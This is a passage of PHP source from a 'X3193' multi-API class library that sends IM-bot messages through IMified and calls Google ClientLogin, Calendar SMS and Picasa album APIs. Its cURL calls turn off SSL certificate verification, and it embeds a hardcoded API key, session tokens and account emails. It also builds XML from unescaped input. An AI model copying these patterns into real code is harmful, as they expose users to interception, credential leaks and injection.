	        $url = "https://www.imified.com/api/bot/";
	        $data = array(
	                'botkey' => $this->botkey,
	                'apimethod' => 'getallusers'
	        );
	        $ch = curl_init();
	        curl_setopt($ch, CURLOPT_URL, $url);
	        curl_setopt($ch, CURLOPT_USERPWD, $imifiedu.':'.$imifiedp);
	        curl_setopt($ch, CURLOPT_HEADER, 0);
	        curl_setopt($ch, CURLOPT_POST, 1);
	        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
	        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
	        $xmlstr = curl_exec($ch);
	        curl_close($ch);
	}
	$objXml = new DOMDocument();  
	$objXml->preserveWhiteSpace = true;
	$objXml->async = false; 
	$objXml->loadXML($xmlstr);
	if (!$objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue){
	        return iconv("gb2312","utf-8","系统接口发生意外错误，请稍后重试");
	}       
	elseif ($objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue != 'ok'){
	        return $objXml->getElementsByTagName("err")->item(0)->attributes->item(0)->nodeValue;
	}
	elseif ($objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue == 'ok'){ // getallusers succes start
	        $objList = $objXml->getElementsByTagName("users")->item(0)->getElementsByTagName("user");
	        $sendflag = 0;
	        for ($i = 0;$i < $objList->length;$i=$i+2){ // for send start
	                $objHdd = $objList->item($i);
	                $imid = $objHdd->getElementsByTagName('userkey')->item(0)->nodeValue;
	                $imuser = $objHdd->getElementsByTagName('user')->item(0)->nodeValue;
	                $imnetwork = $objHdd->getElementsByTagName('network')->item(0)->nodeValue;
	                if (strtolower($objHdd->getElementsByTagName('user')->item(0)->nodeValue) !== strtolower(trim(request('user'))) || strtolower($objHdd->getElementsByTagName('network')->item(0)->nodeValue) !== strtolower(trim(request('network')))){
	                }
	                elseif (strtolower($objHdd->getElementsByTagName('user')->item(0)->nodeValue) === strtolower(trim(request('user'))) && strtolower($objHdd->getElementsByTagName('network')->item(0)->nodeValue) === strtolower(trim(request('network')))){ // find contact to send start
	                        $imreuser = $imuser;
	                        $imrenetwork = $imnetwork;
	                        break;  
	                }  // find contact to send start
	        }	       
	        for ($i = 0;$i < $objList->length;$i=$i+2){ // for send start
	                $objHdd = $objList->item($i);
	                $imid = $objHdd->getElementsByTagName('userkey')->item(0)->nodeValue;
	                $imuser = $objHdd->getElementsByTagName('user')->item(0)->nodeValue;
	                $imnetwork = $objHdd->getElementsByTagName('network')->item(0)->nodeValue;
	                if (strtolower($objHdd->getElementsByTagName('user')->item(0)->nodeValue) !== strtolower($contactstr) || strtolower($objHdd->getElementsByTagName('network')->item(0)->nodeValue) !== strtolower($contactnetworkstr)){
	                }
	                elseif (strtolower($objHdd->getElementsByTagName('user')->item(0)->nodeValue) === strtolower($contactstr) && strtolower($objHdd->getElementsByTagName('network')->item(0)->nodeValue) === strtolower($contactnetworkstr)){ // find contact to send start
	                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
	                                $xmlstr = '<rsp stat="ok">'.
		        '<users count="3"><user><status></status><extendedstatus></extendedstatus><userkey>8C338311-3075-4073-82CEA566F138998C</userkey><screenname>msn.bot.im</screenname><user>msn.bot.im</user><network>Jabber</network><created>{ts \'2010-02-11 15:46:17\'}</created><lastcall>{ts \'2010-06-07 04:36:03\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>C08884D8-940A-4561-ABB21857F2AFCAD0</userkey><screenname>wanw.x3193.3322.org@gmail.com</screenname><user>wanw.x3193.3322.org@gmail.com</user><network>Jabber</network><created>{ts \'2010-05-03 07:17:45\'}</created><lastcall>{ts \'2010-06-05 08:27:57\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>6485AAF9-3DF3-4947-ACABB277DA26531E</userkey><screenname>x3193.cz.cc@gmail.com</screenname><user>x3193.cz.cc@gmail.com</user><network>Jabber</network><created>{ts \'2010-06-05 06:24:42\'}</created><lastcall>{ts \'2010-06-05 12:08:07\'}</lastcall><lastonline></lastonline></user></users>'.
		        '</rsp>';
	                        }       
	                        else{   
	                                $ch = curl_init();
	                                $url = "https://www.imified.com/api/bot/";
	                                $data = array(
							'botkey' => $this->botkey,
							'apimethod' => 'send',
							'userkey' => $objHdd->getElementsByTagName('userkey')->item(0)->nodeValue, 
							'msg' => iconv('gb2312','utf-8','<'.$imreuser.'-'.$imrenetwork.'> '.trim($imcontent).$sCrLf)
	                                );
	                                curl_setopt($ch, CURLOPT_URL, $url);
	                                curl_setopt($ch, CURLOPT_HEADER, 0);
	                                curl_setopt($ch, CURLOPT_USERPWD, $imifiedu.':'.$imifiedp);
	                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
	                                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
	                                $contactxmlstr = curl_exec($ch);
	                                curl_close($ch);
	                        }
	                        $IMobjXml = new DOMDocument();  
	                        $IMobjXml->preserveWhiteSpace = true;
	                        $IMobjXml->async = false; 
	                        $IMobjXml->loadXML($contactxmlstr);                                     
	                        if (!$IMobjXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue){
	                                return iconv("gb2312","utf-8","系统接口发生意外错误，请稍后重试");
	                                $sendflag = 2;
	                        }
	                        elseif ($IMobjXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue != 'ok'){
	                                return $objXml->getElementsByTagName("err")->item(0)->attributes->item(0)->nodeValue;
	                                $sendflag = 2;
	                        }
	                        elseif ($IMobjXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue == 'ok'){       
	                                return iconv("gb2312","utf-8",'信息发送成功');
	                                $sendflag = 1;
	                        }
	                        break;  
	                }  // find contact to send start
	        }  // for send end
	        if ($sendflag == '0'){
	                return iconv('gb2312','utf-8','该帐号未加入此IM机器人'); 
	        }               
	        elseif ($sendflag == '2'){
	                return 'error';         
	        }       
	        else{
	                return 'reset'; 
	        }       
	} // getallusers success end
}

}
?>

<?php 

// ----------------------------------------------------------------
//  Code.google.com - X3193-Google多用户多接口系统非标准独立类 v1.1
//  供能：实现多种接口调用，包括地图、相册、网址、日历等。
//  实现：X3193API
//  供应：google.com
//  收藏：☆☆☆☆☆
//  时间：2011-7-27 11:45AM
//  行数：45行
// ----------------------------------------------------------------
//  更新日志：
// ----------------------------------------------------------------

class google_class{

var $APIkey = 'AIzaSyCXxg93rUCDd9SbpdesR60GFEdrAsD86Mk';

function googleauthclientlogin($uname,$pwd,$product){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = 'SID=DQAAAMgAAACwoBhbJvpTWUVidzccvnpQLemd3sQfmBnwMK6WmqBXZKmfNzEh-ukHDnPtD41gg0gNMiLEuKw4s_gszuFxTalU9kFBKe5U96emac7EYsYrEzE7MBT0DulcB7zNYh89_aIaG22IO__d7PfbJOsm5yTFhNuJD-PunmHTHgS16rDLzqHSZgt16GSfnJRp7_HmtRRGqWnAosqy23guCMFbyVPbrNTbHTOyn7RyFhHAeMvkoXbbdhVGOe44I-iMyuQfQQ59TU9oz8-6mVTFUOyvaT-D '.
                                'LSID=DQAAAMwAAACWBmAaXg2FmTB0uaDGcaR5Ijs1lCKYP4-IUZriF_tEEYsAOo5cylzgQLJPi5QEIsN3cQaeE7destAUfCIxOkZ8n-RHpTpo1uzvaB8SupwMARIOhLXR8q_Zz1BNQd5TxZwfG2K49Wk8by9wA2kTbcmZ0bqbfjIIroQHy370YRVty7VbzXpkXDQ3dee1nfXDDO8jo9FYIiTYDfwWO7WgxaKNj5SH0-CHqCBuoKhdUpLqDXWohmQ7PVQeVvmEgOWEkrcU17Oa-neDhfxbaQLLeg05 '.
                                'Auth=DQAAAMoAAACWBmAaXg2FmTB0uaDGcaR5Ijs1lCKYP4-IUZriF_tEEYsAOo5cylzgQLJPi5QEIsN3cQaeE7destAUfCIxOkZ8n-RHpTpo1uzvaB8SupwMARIOhLXR8q_Zz1BNQd5TxZycY5OdxY6cTAeCT8v3PgYHQuTTxgDxRE2TWtZ9nRPKhdtxYmmMTmKtOIwSh7ydRtxsYRSiFy2hHOtCsx9jBMJKmkXppLpHZ1BlSoU1gLrSNFYwbXVbYpEnVi0ebNZPAPzQf0OctGRYy0N1wqlNjhcx ';
        }       
        else{                   
                $url = "https://www.google.com/accounts/ClientLogin";
                if ($product == 'urlshortener')
                        $server = 'urlshortener';
                elseif ($product == 'calendar') 
                        $server = 'cl'; 
                elseif ($product == 'album')    
                        $server = 'lh2';        
                $data = array(
                        'accountType' => "HOSTED_OR_GOOGLE",
                        'Email' => Base64_decode($uname),
                        'Passwd' => Base64_decode($pwd),
                        'source' => "X3193-X3193-1.00",
                        'service' => $server
                ); // 经验教训 ：数组中的数值不能用URLENCODE
                          
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }       

        $AuthClientLogin = substr(trim($xmlstr),stripos(trim($xmlstr),"Auth=")+5);
        return $AuthClientLogin;
}

function googlecalendarsendsms($AuthClientLogin,$title,$content,$when){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = "";
                $xmlcode = "201";       
        }       
        else{   
                $url = "https://www.google.com/calendar/feeds/default/private/full";
                date_default_timezone_set('UTC'); 
                list($msec, $sec) = explode(" ", microtime());
                $startTime = $sec + 60*0;
                $endTime = $startTime + 60*0 + 7;
                //echo date("YmdHis",$sec+3600*8); 
                $postdata = "<?php xml version='1.0' encoding='gb2312'?><entry xmlns='http://www.w3.org/2005/Atom' xmlns:gd='http://schemas.google.com/g/2005'>".
                        "<category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/g/2005#event'></category>".
                        "<title type='text'>".trim($title)."</title>".
                        "<content type='text'>".trim($content)."</content>".
                        "<gd:transparency value='http://schemas.google.com/g/2005#event.opaque'>".
                        "</gd:transparency>".
                        "<gd:eventStatus value='http://schemas.google.com/g/2005#event.confirmed'>".
                        "</gd:eventStatus>".
                        "<gd:where valueString='".trim($when)."'></gd:where>".
                        "<gd:when startTime='".date("Y",$sec)."-".date("m",$startTime)."-".date("d",$startTime)."T".date("H",$startTime).":".date("i",$startTime).":".date("s",$startTime).".000Z' endTime='".date("Y",$endTime)."-".date("m",$endTime)."-".date("d",$endTime)."T".date("H",$endTime).":".date("i",$endTime).":".date("s",$endTime).".000Z'>".
                        "<gd:reminder minutes='0' method='sms' />".
                        "</gd:when>".
                        "</entry>";     
                unset($header);

                $header[] = "Authorization: GoogleLogin auth=".trim($AuthClientLogin);
                $header[] = "Content-type: application/atom+xml; charset=gb2312";
                $header[] = "Content-length: ".strlen($postdata);
                //$header[] = "If-Match: *";
                $header[] = "GData-Version: 2";
                //$header[] = $postdata;                
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                //curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);                                                 
                $xmlstr = curl_exec($ch);
                $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                curl_close($ch);
                if($xmlcode == '302'){
                        //echo $xmlstr;
                        $gsessionid = substr($xmlstr,stripos($xmlstr, 'gsessionid=')+strlen('gsessionid='),strlen($xmlstr));
                        $gsessionid = substr($gsessionid,0,stripos($gsessionid, '">here</A>'));
                        //echo $gsessionid;
                        //echo date("YmdHis",$sec+3600*8);
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url.'?gsessionid='.$gsessionid);
                        curl_setopt($ch, CURLOPT_HEADER, 1);
                        //curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);                                                 
                        $xmlstr = curl_exec($ch);
                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                        curl_close($ch);
                        //echo $xmlstr.$xmlcode;                                
                }
        }
        return $xmlcode; 
}

function googlealbumlist($authdata,$page,$pagesize){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
		$xmlstr = "<?php xml version='1.0' encoding='UTF-8'?><feed xmlns='http://www.w3.org/2005/Atom' xmlns:gphoto='http://schemas.google.com/photos/2007' xmlns:media='http://search.yahoo.com/mrss/' xmlns:openSearch='http://a9.com/-/spec/opensearchrss/1.0/' xmlns:gml='http://www.opengis.net/gml' xmlns:georss='http://www.georss.org/georss'><id>http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org</id><updated>2010-04-12T14:11:45.201Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#user'/><title type='text'>wanw.x3193.3322.org</title><subtitle type='text'/><icon>http://lh5.ggpht.com/_dm6qv9_mhy8/AAAA4tc3130/AAAAAAAAAAA/q8cyJASE9Zg/s64-c/wanw.x3193.3322.org.jpg</icon><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org'/><link rel='http://schemas.google.com/photos/2007#slideshow' type='application/x-shockwave-flash' href='http://picasaweb.google.com/s/c/bin/slideshow.swf?host=picasaweb.google.com&amp;RGB=0x000000&amp;feed=http%3A%2F%2Fpicasaweb.google.com%2Fdata%2Ffeed%2Fapi%2Fuser%2Fwanw.x3193.3322.org%3Falt%3Drss'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org?start-index=1&amp;max-results=1000'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><generator version='1.00' uri='http://picasaweb.google.com/'>Picasaweb</generator><openSearch:totalResults>2</openSearch:totalResults><openSearch:startIndex>1</openSearch:startIndex><openSearch:itemsPerPage>1000</openSearch:itemsPerPage><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:thumbnail>http://lh5.ggpht.com/_dm6qv9_mhy8/AAAA4tc3130/AAAAAAAAAAA/q8cyJASE9Zg/s64-c/wanw.x3193.3322.org.jpg</gphoto:thumbnail><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5457372612442727137</id><published>2010-04-07T07:00:00.000Z</published><updated>2010-04-07T12:32:58.013Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>X3193</title><summary type='text'/><rights type='text'>public</rights><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5457372612442727137'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/X3193'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5457372612442727137'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><gphoto:id>5457372612442727137</gphoto:id><gphoto:name>X3193</gphoto:name><gphoto:location/><gphoto:access>public</gphoto:access><gphoto:timestamp>1270623600000</gphoto:timestamp><gphoto:numphotos>0</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S7x7egOYIuE/AAAAAAAAACU/hc0BNeb8c7I/X3193.jpg' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'/><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S7x7egOYIuE/AAAAAAAAACU/hc0BNeb8c7I/s160-c/X3193.jpg' height='160' width='160'/><media:title type='plain'>X3193</media:title></media:group></entry><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833</id><published>1970-01-15T17:04:41.000Z</published><updated>2010-04-12T14:11:45.201Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>TEST</title><summary type='text'>TEST</summary><rights type='text'>public</rights><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/TEST'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><gphoto:id>5459253500704784833</gphoto:id><gphoto:name>TEST</gphoto:name><gphoto:location>China</gphoto:location><gphoto:access>public</gphoto:access><gphoto:timestamp>1271081000</gphoto:timestamp><gphoto:numphotos>0</gphoto:numphotos><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/TEST.jpg' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'>TEST</media:description><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/s160-c/TEST.jpg' height='160' width='160'/><media:title type='plain'>TEST</media:title></media:group><georss:where><gml:Envelope><gml:lowerCorner>18.080862 73.5351877</gml:lowerCorner><gml:upperCorner>53.6424579 134.8556062</gml:upperCorner></gml:Envelope><gml:Point><gml:pos>35.86166 104.195397</gml:pos></gml:Point></georss:where></entry></feed>";
        }       
        else{   
                $ch = curl_init();
                $header[] = "Authorization: GoogleLogin auth=".trim($authdata);
                $header[] = "GData-Version: 2";
                //$url = "http://picasaweb.google.com/data/feed/api/user/".arrmember(split('[@]',base64_decode(trim(request("uname")))),0)."?start-index=1&max-results=1000000";
                $url = "http://picasaweb.google.com/data/feed/api/user/default?start-index=1&max-results=1000000";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
        //return $xmlstr;
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        $objList = $objXml->getElementsByTagName("entry");                      

        $albumlist = array();
        $albumlist['length'] = $objList->length;
        $albumlist['username'] = iconv('utf-8','gb2312',$objXml->getElementsByTagName("feed")->item(0)->getElementsByTagName("title")->item(0)->nodeValue);
        
        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
        $totalitem = $objList->length;
        if (fmod($totalitem, $pagesize) == 0){
                $totalpage=$totalitem/$pagesize;
        }       
        else{
                $totalpage=ceil($totalitem/$pagesize);
        }       
        if ($totalpage == $page)
                $endid = $totalitem-1;
        elseif ($totalpage > $page)
                $endid = floor($strpagesize*($page)-1);
        elseif ($totalpage < $page){
                $endid = floor($strpagesize*($page-1)-1);
        }                       

        for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                $objHdd = $objList->item($i);
                        $albumlist[$i]['albumid'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","gphoto:id"),"1"))->item(1)->nodeValue);
                        $albumlist[$i]['albumname'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('title')->item(0)->nodeValue);
                        $albumlist[$i]['albumpublished'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('published')->item(0)->nodeValue);
                        $albumlist[$i]['albumupdated'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('updated')->item(0)->nodeValue);
                        $albumlist[$i]['albumsummary'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('summary')->item(0)->nodeValue);
                        $albumlist[$i]['numphotos'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'gphoto:numphotos'),"1"))->item(0)->nodeValue);
                        $albumlist[$i]['albumaccess'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'gphoto:access'),"1"))->item(0)->nodeValue);
                        $albumlist[$i]['albumlocation'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'gphoto:location'),"1"))->item(0)->nodeValue);
                        $albumlist[$i]['albumkeywords'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'media:keywords'),"1"))->item(0)->nodeValue);
                        $albumlist[$i]['albumcommentcount'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'gphoto:commentCount'),"1"))->item(0)->nodeValue);
                        $albumlist[$i]['albumcommentingEnabled'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]",'gphoto:commentingEnabled'),"1"))->item(0)->nodeValue);
                        $albumlist[$i]['albumlink'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('id')->item(0)->nodeValue);
        }
        return $albumlist;
}

function googlealbumcreate($authclientLogin,$albumid,$albumtitle,$albumsummary,$albumlocation,$albumaccess,$albumcommentingEnabled,$albumkeywords){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
		$xmlstr = "<?php xml version='1.0' encoding='UTF-8'?><entry xmlns='http://www.w3.org/2005/Atom' xmlns:gphoto='http://schemas.google.com/photos/2007' xmlns:media='http://search.yahoo.com/mrss/' xmlns:gml='http://www.opengis.net/gml' xmlns:georss='http://www.georss.org/georss'><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833</id><published>1970-01-15T17:04:41.000Z</published><updated>2010-04-12T14:11:45.201Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'/><title type='text'>TEST</title><summary type='text'>TEST</summary><rights type='text'>public</rights><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org/TEST'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833'/><link rel='edit' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833/1'/><link rel='http://schemas.google.com/acl/2007#accessControlList' type='application/atom+xml' href='http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5459253500704784833/acl'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><gphoto:id>5459253500704784833</gphoto:id><gphoto:name>TEST</gphoto:name><gphoto:location>China</gphoto:location><gphoto:access>public</gphoto:access><gphoto:timestamp>1271081000</gphoto:timestamp><gphoto:numphotos>0</gphoto:numphotos><gphoto:numphotosremaining>1000</gphoto:numphotosremaining><gphoto:bytesUsed>0</gphoto:bytesUsed><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:commentingEnabled>true</gphoto:commentingEnabled><gphoto:commentCount>0</gphoto:commentCount><media:group><media:content url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/TEST.jpg' type='image/jpeg' medium='image'/><media:credit>Yu</media:credit><media:description type='plain'>TEST</media:description><media:keywords/><media:thumbnail url='http://lh6.ggpht.com/_dm6qv9_mhy8/S8MqInBRAcE/AAAAAAAAAGk/zb43PQvhyLQ/s160-c/TEST.jpg' height='160' width='160'/><media:title type='plain'>TEST</media:title></media:group><georss:where><gml:Envelope><gml:lowerCorner>18.080862 73.5351877</gml:lowerCorner><gml:upperCorner>53.6424579 134.8556062</gml:upperCorner></gml:Envelope><gml:Point><gml:pos>35.86166 104.195397</gml:pos></gml:Point></georss:where></entry>";
                $xmlcode = "201";
        }       
        else{   
                if (trim($albumid) == ""){
                        $postdata = "<entry xmlns='http://www.w3.org/2005/Atom' xmlns:media='http://search.yahoo.com/mrss/' xmlns:gphoto='http://schemas.google.com/photos/2007'>".
                                        "<title type='text'>".trim($albumtitle)."</title>".
                                        "<summary type='text'>".trim($albumsummary)."</summary>".
                                        "<gphoto:location>".trim($albumlocation)."</gphoto:location>".
                                        "<gphoto:access>".trim($albumaccess)."</gphoto:access>".
                                        "<gphoto:commentingEnabled>".trim($albumcommentingEnabled)."</gphoto:commentingEnabled>".
                                        "<gphoto:timestamp>".time()."</gphoto:timestamp>".
                                        "<media:group>".
                                        "<media:keywords>".trim($albumkeywords)."</media:keywords>".
                                        "</media:group>".
                                        "<category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#album'></category>".
                                        "</entry>";
                }       
                elseif (trim($albumid) != ""){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
				$xmlstr = "<?php xml version='1.0' encoding='UTF-8'?><feed xmlns='http://www.w3.org/2005/Atom' xmlns:gphoto='http://schemas.google.com/photos/2007' xmlns:media='http://search.yahoo.com/mrss/' xmlns:openSearch='http://a9.com/-/spec/opensearchrss/1.0/' xmlns:gml='http://www.opengis.net/gml' xmlns:georss='http://www.georss.org/georss'><id>http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org</id><updated>2010-04-12T14:11:45.201Z</updated><category scheme='http://schemas.google.com/g/2005#kind' term='http://schemas.google.com/photos/2007#user'/><title type='text'>wanw.x3193.3322.org</title><subtitle type='text'/><icon>http://lh5.ggpht.com/_dm6qv9_mhy8/AAAA4tc3130/AAAAAAAAAAA/q8cyJASE9Zg/s64-c/wanw.x3193.3322.org.jpg</icon><link rel='http://schemas.google.com/g/2005#feed' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org'/><link rel='alternate' type='text/html' href='http://picasaweb.google.com/wanw.x3193.3322.org'/><link rel='http://schemas.google.com/photos/2007#slideshow' type='application/x-shockwave-flash' href='http://picasaweb.google.com/s/c/bin/slideshow.swf?host=picasaweb.google.com&amp;RGB=0x000000&amp;feed=http%3A%2F%2Fpicasaweb.google.com%2Fdata%2Ffeed%2Fapi%2Fuser%2Fwanw.x3193.3322.org%3Falt%3Drss'/><link rel='self' type='application/atom+xml' href='http://picasaweb.google.com/data/feed/api/user/wanw.x3193.3322.org?start-index=1&amp;max-results=1000'/><author><name>Yu</name><uri>http://picasaweb.google.com/wanw.x3193.3322.org</uri></author><generator version='1.00' uri='http://picasaweb.google.com/'>Picasaweb</generator><openSearch:totalResults>2</openSearch:totalResults><openSearch:startIndex>1</openSearch:startIndex><openSearch:itemsPerPage>1000</openSearch:itemsPerPage><gphoto:user>wanw.x3193.3322.org</gphoto:user><gphoto:nickname>Yu</gphoto:nickname><gphoto:thumbnail>http://lh5.ggpht.com/_dm6qv9_mhy8/AAAA4tc3130/AAAAAAAAAAA/q8cyJASE9Zg/s64-c/wanw.x3193.3322.org.jpg</gphoto:thumbnail><entry><id>http://picasaweb.google.com/data/entry/api/user/wanw.x3193.3322.org/albumid/5457372612442727137</id><published>2010-04-07T07:00:00.000Z</published><updated>2010-04-07T12:32:58.013Z</updated><category 